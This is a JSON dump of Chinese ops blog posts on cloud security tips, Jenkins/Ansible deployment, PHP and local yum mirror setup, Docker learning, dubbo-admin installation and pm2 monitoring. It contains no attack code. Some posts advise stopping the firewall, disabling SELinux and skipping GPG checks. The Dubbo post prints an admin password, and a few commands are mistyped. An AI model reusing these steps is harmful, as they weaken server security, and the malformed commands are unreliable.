定期备份数据。在阿里云上，建议企业开启镜像和快照，每天进行备份，并保存3份以上的版本。这样即使遇到勒索软件病毒入侵，也可以迅速恢复到1天前的业务数据。 对服务器进行合理的安全域规划。建议使用阿里云的VPC服务，用于隔离不同租户间业务应用。同时将不同安全级别的服务器，划分到不同的安全域。以免低安全域的服务器中招后，感染高安全域的其它服务器。 服务口令和远程访问权限管理。服务器的口令建议至少8位以上，同时必须包含复杂的字符。不应向外网直接开放服务器的远程访问权限。如需要远程运维，建议通过阿里云.云市场上的IPsecVPN或SSLVPN的远程访问解决方案。推荐企业在VPC网关处部署云市场的专业防火墙镜像系统：其可同时支持VPN的远程访问，还可实现VPC南北向流量的访问控制。 服务器对外只开放必要的端口，控制服务器的主动外联访问。可以在VPC 网关处的防火墙，或阿里云安全组防火墙上，设置服务器对外访问端口。只开放必要的端口，减少攻击面，保护服务器的安全。同时，通过阿里云安全组防火墙禁止服务器的主动访问行为，以阻止受感染服务器可能会尝试连接C&amp;C服务器。 服务器口令和漏洞的防护。建议使用阿里云云盾的安骑士产品，以对非法破解密码的行为进行识别，避免被黑客多次猜解密码而入侵。同时可以一键清除网站后门维护服务器环境纯净，批量修复高危漏洞。 Web应用漏洞的防护。对于Web网站，推荐使用阿里云云盾WAF，用于防御OWASP 常见威胁，并对SQL注入、XSS跨站、Webshell上传、后门隔离保护、命令注入、非法HTTP协议请求、常见Web服务器漏洞攻击、核心文件非授权访问、路径穿越、扫描防护等安全防护；定期及时更新0day补丁，对网站进行安全防护。","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"讲如何结合jenkins+ ansible构建发布系统","slug":"自动化+可视化/Jenkins/讲如何结合jenkins+ ansible构建发布系统","date":"2016-10-29T03:34:17.000Z","updated":"2016-12-17T11:28:54.000Z","comments":true,"path":"2016/10/29/自动化+可视化/Jenkins/讲如何结合jenkins+ ansible构建发布系统/","link":"","permalink":"http://blog.yangcvo.me/2016/10/29/自动化+可视化/Jenkins/讲如何结合jenkins+ ansible构建发布系统/","excerpt":"","text":"jenkins+ansible，打造一个web构建发布系统自动化这块我们测试生产环境已经用起来了。 这篇文章主要讲我们如何实现整个web发布系统，如何安装配置看我blog上面有。 需要了解几款自动化工具： SaltStack,Ansible,Puppet,jenkins 所以我们第1步做的就是：用Ansible + Jenkins搞定自动发布。Ansible是相对简单的批量管理工具，支持模板管理等高级功能。搞定了自动发布，开发的服务器需求已经明显下降，只要把代码提交到 Git主干，就会自动触发发布。 Git使用的是 GitLab，后期同时为了安全我们做了一层LDAP代理，效果相当于“将军令”，操作机、Git和Jenkins用 OpenLDAP 做统一认证，后续用到的Redmine、Grafana、Zabbix等都接入了OpenLDAP认证，每个人都有个动态口令，每次验证都需要用到。 流程结构 简单绘制了下Jenkins的一个流程，如下图： 拓扑图 1234567891011121314151617181920212223 &gt; 该平台以jenkins 为中心，然后围绕他进行扩展。 &gt; 代码全局配置通过”文件管理平台” 进行管理。每次代码进行build时，pull一下配置。使配置为最新的。 &gt; 开发人员将代码push到gitlab，开发者之间相互review代码。然后murge到master分支。jenkins上的pull代码到workspace空间。 &gt; 安装一些依赖的第三方包。 &gt; 代码和配置文件进行合并，通过redis存储的版本信息创建版本。 &gt; 把将要发布的版本推送到远端机器，reload服务实现上线。 &gt; 当发布的代码出现问题，回滚指定版本(默认回滚上一版本)，最多可回滚之前5个版本。``` ansible是新出现的自动化运维工具，基于Python开发，集合了众多运维工具（puppet、cfengine、chef、func、fabric）的优点，实现了批量系统配置、批量程序部署、批量运行命令等功能。ansible是基于模块工作的，本身没有批量部署的能力。真正具有批量部署的是ansible所运行的模块，ansible只是提供一种框架。主要包括：```bash(1)、连接插件connection plugins：负责和被监控端实现通信；(2)、host inventory：指定操作的主机，是一个配置文件里面定义监控的主机；(3)、各种模块核心模块、command模块、自定义模块；(4)、借助于插件完成记录日志邮件等功能；(5)、playbook：剧本执行多个任务时，非必需可以让节点一次性运行多个任务。 这里之前用Jenkins使用起来。遇到个难题这里分析哪几点： 1234567github作为源代码仓库 jenkins做为打包服务器，Web控制服务器在jenkins的系统配置里，可以找到maven，git，Java相关的配置，只要勾选了，在开时执行job时，会自动下载。ansible把war包，发布到远程机器tomcat每台服务器环境都需要在ansible /etc/ansible/hosts配置好，这样可以让它自动化下发到对应机器。把jenkins生成的war包发布到远程服务器上。进入该项目的workspace目录下保存该playbook的仓库子目录下, 检查ansible版本, 并执行最终的部署命令.会不会发布出现乱码。 监控： 由于原始的监控不满足快速增长的业务，我这边部署了开源监控系统 Zabbix，虽然运维能够很好的使用Zabbix，但其他部门同事总觉得易用性不高、而且很多定制化监控实现起来很麻烦。还是需要有运维开发同事帮忙辅助会更好。","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.yangcvo.me/tags/Jenkins/"}]},{"title":"PHP编译升级YUM最全面安装部署","slug":"PHP/PHP编译升级YUM最全面安装部署","date":"2016-10-21T08:31:11.000Z","updated":"2017-04-12T12:21:17.000Z","comments":true,"path":"2016/10/21/PHP/PHP编译升级YUM最全面安装部署/","link":"","permalink":"http://blog.yangcvo.me/2016/10/21/PHP/PHP编译升级YUM最全面安装部署/","excerpt":"","text":"编译安装1.获取安装包： PHP最新源码包 2.获取安装php需要的支持文件：libxml2官网最新源码包 3.Libxm2下载地址：Libxm2ftp地址 3.安装libxml212345 curl -O http://oak0aohum.bkt.clouddn.com/libxml2-2.6.32.tar.gz /tmp/.cd /tmp/ &amp;&amp; tar zxvf libxml2-2.6.32.tar.gzcd libxml2-2.6.32./configure --prefix=/usr/local/libxml2 &amp;&amp; make &amp;&amp; make install 如果安装成功以后，在/usr/local/libxml2/目录下将生成bin、include、lib、man和share五个目录。在后面安装PHP5源代码包的配置时，会通过在configure命令的选项中加上&quot;--with-libxml-dir=/usr/local/libxml2&quot;选项，用于指定安装libxml2库文件的位置。 4.安装php7.012345#curl -O http://oak0aohum.bkt.clouddn.com/php-7.0.9.tar.gz -C /tmp/.#cd /tmp/ &amp;&amp; tar zvxf php-7.0.9.tar.gz#cd php-7.0.9#./configure --prefix=/usr/local/php --with-mysql=/usr/local/mysql --with-apxs=/usr/local/apache2/bin/apxs --with-libxml-dir=/usr/local/libxml2#make &amp;&amp; make install 设置软链接： 12345ln -s /usr/local/php/bin/php /usr/bin/phpphp -versionPHP 7.0.9 (cli) (built: Jul 24 2016 17:17:47) ( NTS )Copyright (c) 1997-2016 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies 然后cpopy PHP的配置文件 1cp php-7.0.9/php.ini-development /usr/local/php/lib/php.ini （如果没有php.ini.dist 则把php.ini-development php.ini-production中的任何一个重命名为php.ini.dist即可）修改php.ini文件 register_globals = On 5.测试php是否成功安装写一个php测试页info.php，放到apache2/htdocs中。 12345&lt;?php phpinfo();?&gt;; 在浏览器中输入：服务器地址/info.php 如果能正常显示出php的信息. YUM一键安装centos yum安装PHP 1yum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php yum安装默认路径： 123PHP主目录 /etc/php.d/PHP配置文件 /etc/php.iniPHP模块位置 /usr/lib/php/ 或者 /usr/lib64/php/ PHP升级最新版快速将PHP 5.3升级至PHP 5.5CentOS 6.7以下为 CentOS 下安装 PHP 方法： 添加 epel 源 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm 添加 remi 源 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装 PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt 查看 PHP 版本 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies 启动 php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] 这里重启完以后，记得要让php生效，不然的话不行。 我一开始刷新还是出现了500错误，后来用php指针测试了下版本是多少？ www站点添加。info.php 12345&lt;?php phpinfo();?&gt;; 访问地址/info.php 出现版本是5.3 环境问题，重启http就可以了。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://blog.yangcvo.me/tags/PHP/"}]},{"title":"Centos7本地yum源搭建及实时同步","slug":"Linux笔记/YUM/Centos7本地yum源搭建及实时同步","date":"2016-10-21T08:12:23.000Z","updated":"2017-03-14T10:32:06.000Z","comments":true,"path":"2016/10/21/Linux笔记/YUM/Centos7本地yum源搭建及实时同步/","link":"","permalink":"http://blog.yangcvo.me/2016/10/21/Linux笔记/YUM/Centos7本地yum源搭建及实时同步/","excerpt":"","text":"搭建本地yum源 YUM介绍 YUM主要用于自动升级、安装\\移除rpm软件包，它能自动查找并解决rpm包之间的依赖关系，要成功的使用YUM工具更新系统和软件，需要有一个包含各种rpm软件包的repository（软件仓库），提供软件仓库的服务器习惯上成为“源”服务器。网络上有大量的源服务器，但是，由于受到网络连接速度、带宽的限制，导致软件安装耗时过长甚至失败。特别是当有大量服务器大量软件包需要升级时，更新的缓慢程序令人难以忍受。相比较而言，本地YUM源服务器最大优点在局域网的快速网络连接和稳定性。 主要我们公司用到这点： 有了局域网中的YUM源服务器，即便在Internet连接中断的情况下，也不会影响其他YUM客户端的软件升级和安装。 为了减少公司内部大量vps使用外部yum源导致带宽不足情况，于是就搭建一台本地yum源服务器，通过脚本服务器定时去镜像站点更新yum数据。 尽管有很多的免费镜像提供yum源服务，但是还是有必要建立自己的yum服务器，主要出于以下几点考虑： l 网络速度：访问互联网可能比较慢 l 节省带宽：如果有大量的服务器，架设自己的yum源可以有效节省互联网带宽 l 联网限制：对于有些内网服务器，不能连接到互联网 l 对于RHEL(Redhat Enterprise Linux)，需要购买服务 l 便于发布自己开发的rpm包 找到适合你的站点的yum同步源,主要是CentOS标准软件仓库、epel、以及rpmforge CentOS标准仓库选择列表 1234567891011 Asian： http://www.centos.org/modules/tinycontent/index.php?id=32 North American http://www.centos.org/modules/tinycontent/index.php?id=30 Epel源选择列表 http://mirrors.fedoraproject.org/publiclist/EPEL/ Rpmforge源 http://apt.sw.be/ 要选尽量离你的local服务器近的地区,并支持RSYNC,方便更新同步 我选择的是Linux Kernel Archives 123456789 CentOS标准软件仓库 rsync://mirrors.kernel.org/centos Epel源 rsync://mirrors.kernel.org/fedora-epel Rpmforge源 rsync://ftp-stud.fht-esslingen.de/dag rsync://mirror.cpsc.ucalgary.ca/dag 下面就介绍下 本地yum源的搭建。一、启动 httpd 服务（一般httpd服务已经安装）可以参考我写的安装httpd：CentOS安装httpd 取一台 CentOS操作系统的机器作为源服务器。启动服务器的httpd 服务： 1service httpd start 可查看配置文件: /etc/httpd/conf/httpd.conf了解httpd相关配置信息这里我们配置的文档根目录为：/var/www/html/端口: Listen 80 默认yum安装的目录就在/var/www/html 12vim /etc/httpd/conf/httpd.confDocumentRoot \"/var/www/html\" 确认服务启动，浏览器访问： http://localhost:80 出现apache页面（如果从其他机器访问，请先关闭防火墙：service iptables stop ） 二、安装 createrepo 工具 （若使用 linux iso 镜像 则为非必须）createrepo是linux下的创建仓库的软件包。 1、在机器联网的情况下可直接安装： yum install createrepo2、可使用rpm -ivh createrepo-xxx.noarch.rpm安装由网上下载的rpm包，一般会有两个依赖3、linux常用工具rpm包，一般在镜像文件中都存在 三、安装 yum 源1、使用 Linux ISO 镜像中的RPM包安装 （1）将 ISO 文件 copy 到服务器上，并在文件夹: /var/www/html/下创建文件夹 CentOS （2）将 ISO文件挂载至文件夹 /var/www/html/CentOS 执行： mount -o loop /var/www/html/CentOS-6.7-x86_64-minimal.iso /var/www/html/CentOS 123456[root@yum_01 html]# ll总用量 404488drwxr-xr-x 2 root root 4096 3月 14 16:33 CentOS-rw-r--r-- 1 root root 414187520 3月 14 16:32 CentOS-7-x86_64-Minimal-1503-01.iso[root@yum_01 html]# mount -o loop /var/www/html/CentOS-7-x86_64-Minimal-1503-01.iso /var/www/html/CentOSmount: /dev/loop0 写保护，将以只读方式挂载 (取消挂载 umount /var/www/html/CentOS) 1[root@yum_01 html]# umount /var/www/html/CentOS （3）查看文件夹 /var/www/html/CentOS 1234567891011121314[root@yum_01 html]# cd CentOS[root@yum_01 CentOS]# ll-rw-r--r-- 1 root root 16 4月 1 2015 CentOS_BuildTagdrwxr-xr-x 3 root root 2048 3月 28 2015 EFI-rw-r--r-- 1 root root 215 3月 28 2015 EULA-rw-r--r-- 1 root root 18009 3月 28 2015 GPLdrwxr-xr-x 3 root root 2048 3月 28 2015 imagesdrwxr-xr-x 2 root root 2048 3月 28 2015 isolinuxdrwxr-xr-x 2 root root 2048 3月 28 2015 LiveOSdrwxr-xr-x 2 root root 53248 4月 1 2015 Packagesdrwxr-xr-x 2 root root 4096 4月 1 2015 repodata-rw-r--r-- 1 root root 1690 3月 28 2015 RPM-GPG-KEY-CentOS-7-rw-r--r-- 1 root root 1690 3月 28 2015 RPM-GPG-KEY-CentOS-Testing-7-r--r--r-- 1 root root 2883 4月 1 2015 TRANS.TBL 可以看到 repodata文件夹的存在，repodata作为软件的仓库信息文件。ISO镜像 yum源搭建OK浏览器访问：http://localhost:80/CentOS/ 2、使用 自己准备的 RPM 包 （这里以 apache ambari为例） （1）在目录 /var/www/html/ 下建立一个文件夹，把准备的 RPM包放到里面. （2）更新 yum源 yum clean 清除yum源缓存 yum repolist 列出可用yum源 1234567891011121314[root@yum_01 yum.repos.d]# yum clean all #清空软件仓库缓存已加载插件：fastestmirror正在清理软件源： baseCleaning up everythingCleaning up list of fastest mirrors[root@yum_01 yum.repos.d]# yum repolist 已加载插件：fastestmirrorbase | 3.6 kB 00:00:00(1/2): base/group_gz | 1.4 kB 00:00:00(2/2): base/primary_db | 516 kB 00:00:00Determining fastest mirrors源标识 源名称 状态base CentOS 6776repolist: 6776 （3）使用 （尝试安装postgresql） 1# yum isntall -y postgresql 五、可能会出现的问题 1、问题 you don’t have permission to access / on this server(Apache Server权限访问问题） Apache Http Server已经在linux上安装完成，可是通过浏览器访问，却出现了“you don’t have permission to access / on this server”. 解决： 123456789101112131415在httpd.conf文件中，有这么一段&lt;Directory/&gt; # 这里的目录为自己的目录Options FollowSymLinksAllowOverride NoneOrder deny,allowDeny from all&lt;/Directory&gt;可以尝试把Deny改成Allow，然后重启apache服务，访问页面，看问题是否解决。 2、问题： Loaded plugins: fastestmirror, refresh-packagekit, security Determining fastest mirrors http://10.1.33.21/ambari/repodata/repomd.xml: [Errno 14] PYCURL ERROR 22 - &quot;The requested URL returned error: 403 Forbidden&quot; Trying other mirror. Error: Cannot retrieve repository metadata (repomd.xml) for repository: ambari-1.x. Please verify its path and try again 解决： yum源服务器运行如下命令 setenforce 0 # 暂时禁用SELinux服务 3、问题： 1234567891011yum install xxx.rpmwarning：Package xxx.rpm is not signed解决：只要在在后面加上--nogpgcheck就可以了，格式如下yum install *rpm --nogpgcheck","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"个人总结：为什要学习docker，如何学习Docker","slug":"运维笔记/个人总结：为什要学习docker，如何学习Docker","date":"2016-10-10T02:55:59.000Z","updated":"2016-11-22T07:42:50.000Z","comments":true,"path":"2016/10/10/运维笔记/个人总结：为什要学习docker，如何学习Docker/","link":"","permalink":"http://blog.yangcvo.me/2016/10/10/运维笔记/个人总结：为什要学习docker，如何学习Docker/","excerpt":"","text":"学习任何一个开源新技术，首先问自己几个问题： 为什要学习它？ 学习它需要了解哪些相关知识点？ 如何快速学习？ 该技术的使用场景是什么？ 拿我个人的学习经验来举例（本人之前比较了解KVM，ESxi,OpenStack） 为什要学习docker？个人回答： 1234567docker是轻量级虚拟化技术，docker使linux容器技术的应用更加简单和标准化docker的速度很快,容器启动时毫秒级的docker将开发和运维职责分清docker解决了依赖地狱问题docker支持几乎所有操作系统docker有着飞速发展的生态圈很多IT巨头逐渐加入和支持 学习它需要了解哪些相关知识点？ 回答： 123456789云计算概念相关（restapi, 微服务，OpenStack）Linux 系统管理（软件包管理，用户管理，进程管理等）Linux 内核相关（Cgroup, namespace 等）Linux 文件系统和存储相关（AUFS，BRFS,devicemapper 等）Linux 网络（网桥，veth,iptables等）Linux安全相关（Appmor,Selinux 等）Linux进程管理（Supervisord,Systemd etc)Linux容器技术（LXC等）开发语言（Python, GO,Shell 等） 3.如何快速学习？ 1234回答：个人体会最好有一个实际的需求或项目来边实践边学习，入门可以参考（第一本docker书）写的不错，非常适合入门。除此之外，阅读牛人的blog比如官方blog http://blog.docker.com/ 最后，参与社区互动也是很好的学习方式。 该技术的使用场景是什么？ 回答：docker非常适用于dev/test CI/CD 场景，用完就扔。还有就是PasS了。 为什要学习Docker1.学习Docker，如果没有云计算的基本知识，以及内核的基本知识，那么学习并理解起来会稍吃力。作为容器，Docker容器的优势在哪，不足在哪，最好了解容器的实现是怎样的（简单了解）；拥有镜像管理，Docker又该如何体现软件开发，集成，部署，发布，再迭代的软件生命周期管理优势。以上两点我认为最为关键，有这两方面的认识势必会对之后的工作帮助巨大。 2.关于学习资源，起码的硬件设施总是要有的。Docker及其生态的发展很快，不使用纯理论肯定收效甚微。另外，资源还包括Docker官方，各大电子媒体平台，技术论坛，开源社区等，往往大拿的观点能点破自己的困惑，或者让自己知道哪方面的认识还很欠缺，以及让自己少走很多的弯路。 3.个人兴趣的话，归结为强扭的瓜不甜。起码应该认同Docker的设计价值，以及Docker的未来潜力，当然有依据的批判Docker并带动大家的思考，也是深切关注的表现。 4.个人发展方向，我认为如果需要把Docker当作软件生命周期管理工具的话，那用好Docker最为重要，API及命令的理解与使用是必需的。如果专注系统设计方面，那么除Docker以上的知识与经验之外，若有Docker源码的学习与理解，那么这些肯定会让你的Docker水平提高一个层次。 学习Docker，最大的好处是跟进新技术发展方向。我觉得在校生应该没有多少硬性需求在Docker的研究上，这也是为什么学校没做具体应用要求的原因。最实际的做法是看一些Docker使用案例，自己实践出一些经验应该会再以后的社会实践中起到作用。 研究docker的源代码，应该到你下定决心从事云计算方面的事业或者研究，那么你就需要以研究者的身份去做仔细的源码分析的工作。 Docker火起来的真正原因是什么？我认为有这么几点， 123普通开发者有机会接触容器技术，享受开发发布一体化的便利。容器云是区别于传统IaaS服务的另一种更快速更高效的轻量级选择。基于镜像的第二个GitHub、CI/CD服务、代码发布、在线debug。","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[]},{"title":"Dubbo管控台dubbo-admin的安装配置","slug":"Java-Dubbo/Dubbo监控管控台dubbo-admin的安装配置","date":"2016-09-26T09:44:04.000Z","updated":"2017-04-20T17:25:45.000Z","comments":true,"path":"2016/09/26/Java-Dubbo/Dubbo监控管控台dubbo-admin的安装配置/","link":"","permalink":"http://blog.yangcvo.me/2016/09/26/Java-Dubbo/Dubbo监控管控台dubbo-admin的安装配置/","excerpt":"","text":"前言：公司之前的java框架都是根据一层层代理去实现的，这次整体架构换Dubbo去实现分布式服务，Dubbo对于服务提供方和服务消费方。监控也是监控服务状态可以降权，在运维管理维护方面也提高了很大帮助。 Dubbo框架设计一共划分了10个层，而最上面的Service层是留给实际想要使用Dubbo开发分布式服务的开发者实现业务逻辑的接口层。图中左边淡蓝背景的为服务消费方使用的接口，右边淡绿色背景的为服务提供方使用的接口， 位于中轴线上的为双方都用到的接口。 下面，结合Dubbo官方文档，我们分别理解一下框架分层架构中，各个层次的设计要点： 123456789101. 服务接口层（Service）：该层是与实际业务逻辑相关的，根据服务提供方和服务消费方的业务设计对应的接口和实现。2. 配置层（Config）：对外配置接口，以ServiceConfig和ReferenceConfig为中心，可以直接new配置类，也可以通过spring解析配置生成配置类。3. 服务代理层（Proxy）：服务接口透明代理，生成服务的客户端Stub和服务器端Skeleton，以ServiceProxy为中心，扩展接口为ProxyFactory。4. 服务注册层（Registry）：封装服务地址的注册与发现，以服务URL为中心，扩展接口为RegistryFactory、Registry和RegistryService。可能没有服务注册中心，此时服务提供方直接暴露服务。5. 集群层（Cluster）：封装多个提供者的路由及负载均衡，并桥接注册中心，以Invoker为中心，扩展接口为Cluster、Directory、Router和LoadBalance。将多个服务提供方组合为一个服务提供方，实现对服务消费方来透明，只需要与一个服务提供方进行交互。6. 监控层（Monitor）：RPC调用次数和调用时间监控，以Statistics为中心，扩展接口为MonitorFactory、Monitor和MonitorService。7. 远程调用层（Protocol）：封将RPC调用，以Invocation和Result为中心，扩展接口为Protocol、Invoker和Exporter。Protocol是服务域，它是Invoker暴露和引用的主功能入口，它负责Invoker的生命周期管理。Invoker是实体域，它是Dubbo的核心模型，其它模型都向它靠扰，或转换成它，它代表一个可执行体，可向它发起invoke调用，它有可能是一个本地的实现，也可能是一个远程的实现，也可能一个集群实现。8. 信息交换层（Exchange）：封装请求响应模式，同步转异步，以Request和Response为中心，扩展接口为Exchanger、ExchangeChannel、ExchangeClient和ExchangeServer。9. 网络传输层（Transport）：抽象mina和netty为统一接口，以Message为中心，扩展接口为Channel、Transporter、Client、Server和Codec。10. 数据序列化层（Serialize）：可复用的一些工具，扩展接口为Serialization、 ObjectInput、ObjectOutput和ThreadPool。 一、Dubbo管控台简介管理控制台的功能主要包括：路由规则，动态配置，服务降级，访问控制，权重调整，负载均衡，等管理功能。 二、环境准备 IP：10.132.18.23部署容器：tomcat7端口：8080 本次dubbo-admin管控台的安装是基于zookeeper注册中心，安装前请确保已成功安装zookeeperzookeeper的集群安装可参照：ZooKeeper集群快速搭建与优化 三、具体的安装步骤1、下载或者上传tomcat7（apache-tomcat-7.0.62.tar）到/sr/下载或者上传Dubbo管控台程序dubbo-admin-2.5.3.war到/srv/创建对应目录&amp;&amp; 创建对应服务用户，给予授权属组。 2、解压tomcat7的安装包并重命名为dubbo-monitor3、移除/srv/tomcat/tomcat_monitor/webapps/目录下的所有文件. 12345678[root@tomcat-monitor_01 ~]# mkdir /srv/tomcat/[root@tomcat-monitor_01 ~]# useradd -s /sbin/nologin -G tomcat [root@tomcat-monitor_01 ~]# tar -zxvf apache-tomcat-7.0.62.tar.gz[root@tomcat-monitor_01 ~]# mv apache-tomcat-7.0.62 tomcat_monitor[root@tomcat-monitor_01 ~]# mv tomcat_monitor /srv/tomcat/.[root@tomcat-monitor_01 ~]# cd /srv/tomcat/tomcat_monitor/webapps[root@tomcat-monitor_01 ~]# rm -rf *[root@tomcat-monitor_01 ~]# chown -R tomcat:tomcat /srv/tomcat 4、将dubbo-admin-2.5.3.war直接解压对应目录/srv/tomcat/tomcat_monitor/webapps/.5、解压dubbo-admin-2.5.3.war并重命名为ROOT 1[root@tomcat-monitor_01 ~]# unzip dubbo-admin-2.5.3.war -d ROOT 注意：解压重命名完成后，记得把之前的dubbo-admin-2.5.3.war包移除，不然后面在启动tomcat的时候又会把dubbo-admin-2.5.3.war解压，造成一些不可描述的问题。 1[root@tomcat-monitor_01 ~]# rm -rf dubbo-admin-2.5.3.war 6、配置dubbo.properties 12345[root@tomcat-monitor_01 ~]# vim ROOT/WEB-INF/dubbo.properties将配置信息配置为：dubbo.registry.address=zookeeper://10.28.32.30:2181?backup=10.47.100.23:2181,10.27.23.75:2181dubbo.admin.root.password=TUJ3dKXqyAzuddTTzaYseB dubbo.admin.guest.password=guest 参数说明： 123dubbo.registry.address：注册中心的配置地址，上文中注册中心是使用zookeeper三台机器的集群，如果只有一台机器，则配置为：dubbo.registry.address=zookeeper://10.28.32.30:2181即可dubbo.admin.root.password：管控台root用户的登录密码dubbo.admin.guest.password：管控台guest用户的登录密码 7、切换到root用户，开启防火墙的8080端口 123456# vi /etc/sysconfig/iptables增加：## duoob-admin-tomcat-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT ##指定内网访问重启防火墙：# service iptables restart 8、启动tomcat（普通用户启动）加入开机启动项 12345[tomcat@tomcat-monitor_01 ~]# /srv/tomcat/tomcat_monitor/bin/startup.sh切换到root用户，修改rc.local文件[tomcat@tomcat-monitor_01 ~]# vi /etc/rc.local增加以下脚本（脚本大意为：切换到dreyer05用户，执行xx.sh）[tomcat@tomcat-monitor_01 ~]#su - tomcat '/srv/tomcat/tomcat_monitor/bin/startup.sh start' 这里我做了Nginx代理，所有防火墙设置内网网卡可以互通。 访问：","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"},{"name":"Dubbo","slug":"Dubbo","permalink":"http://blog.yangcvo.me/tags/Dubbo/"}]},{"title":"使用keymetrics实时监控Node.js程序","slug":"Node.js/使用keymetrics实时监控Node.js程序","date":"2016-09-24T10:14:35.000Z","updated":"2017-03-29T10:17:26.000Z","comments":true,"path":"2016/09/24/Node.js/使用keymetrics实时监控Node.js程序/","link":"","permalink":"http://blog.yangcvo.me/2016/09/24/Node.js/使用keymetrics实时监控Node.js程序/","excerpt":"","text":"通过pm2能守护node.js程序永远在线，在实际应用中是非常有必要的。另外，pm2配合keymetrics能实时监控node.js程序的运行，达到监控node.js程序的目的。 安装pm2 pm2可以使我们的node.js或io.js程序永远在线。这是pm2的官方介绍： PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks. 参考地址：https://github.com/Unitech/pm2#usagefeatureshttps://www.npmjs.com/package/pm2 安装pm2官网地址：http://pm2.keymetrics.io/ npm install -g pm2 启动一个node.js程序 //进入到app的目录去启动 pm2 start index.js --name &apos;yjk&apos; 其他常用命令： 1234567891011121314//查看pm2守护的apppm2 list//或者pm2 status//重启，restart后面跟--name后面指定的名字pm2 restart ghost//查看进程的使用资源情况pm2 monit//查看logpm2 logs ghost//查看app的更多详细信息，后面跟idpm2 describe 1//升级pm2，升级完毕后自动加载之前运行中的所有appnpm install pm2@latest -g ; pm2 updatePM2 使用Keymetrics可以配合pm2来监控node.js程序（也支持io.js程序的监控）。 安装Keymetrics 首先需要注册Keymetrics：https://app.keymetrics.io/#/register 登录后，通过new bucket新建，然后进入控制面板，可以看到分配的public key 和secret key。然后，在安装有pm2的服务器端输入以下命令 pm2 link Secret key Public key [machine name] pm2 interact your-secret-key your-public-key 监控成功后，会有类似下面的提示： [Keymetrics.io] [Agent created] Agent ACTIVE - Web Access: https://app.keymetrics.io/ Monitor your server with:监控您的服务器： pm2 install pm2-server-monit 此时，pm2会把收集到的统计信息实时地推送到Keymetrics，我们可以在Keymetrics的后台中实时地查看到node.js程序的运行信息，其中还有一些快捷操作，如重启node.js程序等。 参考官网：http://pm2.keymetrics.io/docs/usage/quick-start/","raw":null,"content":null,"categories":[],"tags":[{"name":"node.js","slug":"node-js","permalink":"http://blog.yangcvo.me/tags/node-js/"},{"name":"pm2","slug":"pm2","permalink":"http://blog.yangcvo.me/tags/pm2/"}]},{"title":"运维工程师的职责和前景","slug":"运维笔记/运维工程师的职责和前景","date":"2016-09-21T02:55:59.000Z","updated":"2016-11-22T07:42:46.000Z","comments":true,"path":"2016/09/21/运维笔记/运维工程师的职责和前景/","link":"","permalink":"http://blog.yangcvo.me/2016/09/21/运维笔记/运维工程师的职责和前景/","excerpt":"","text":"运维工程师的职责和前景运维中关键技术点解剖： 123451 大量高并发网站的设计方案 ；2 高可靠、高可伸缩性网络架构设计；3 网站安全问题，如何避免被黑？4 南北互联问题,动态CDN解决方案；5 海量数据存储架构 一、什么是大型网站运维？首先明确一下，全文所讲的”运维“是指：大型网站运维，与其它运维的区别还是蛮大的；然后我们再对大型网站与小型网站进行范围定义，此定义主要从运维复杂性角度考虑，如网站规范、知名度、服务器量级、pv量等考虑，其它因素不是重点； 因此，我们先定义服务器规模大于1000台，pv每天至少上亿（至少国内排名前10），如sina、baidu、QQ，51.com等等； 其它小型网站可能没有真正意义上的运维工程师，这与网站规范不够和成本因素有关，更多的是集合网络、系统、开发工作于一身的“复合性人才”，就如有些公司把一些合同采购都纳入了运维职责范围，还有如IDC网络规划也纳入运维职责。所以，非常重要一定需要明白： 1运维对其它关联工种必须非常了解熟悉：网络、系统、系统开发、存储，安全,DB等； 我在这里所讲的运维工程师就是指专职运维工程师。我们再来说说一般产品的“出生”流程： 12345671、首先公司管理层给出指导思想，PM定位市场需求（或copy成熟应用）进行调研、分析、最终给出详细设计。2、架构师根据产品设计的需求，如pv大小预估、服务器规模、应用架构等因素完成网络规划,架构设计等（基本上对网络变动不大，除非大项目）3、开发工程师将设计code实现出来、测试工程师对应用进行测试。4、好，到运维工程师出马了，首先明确一点不是说前三步就与运维工作无关了，恰恰相反，前三步与运维关系很大： 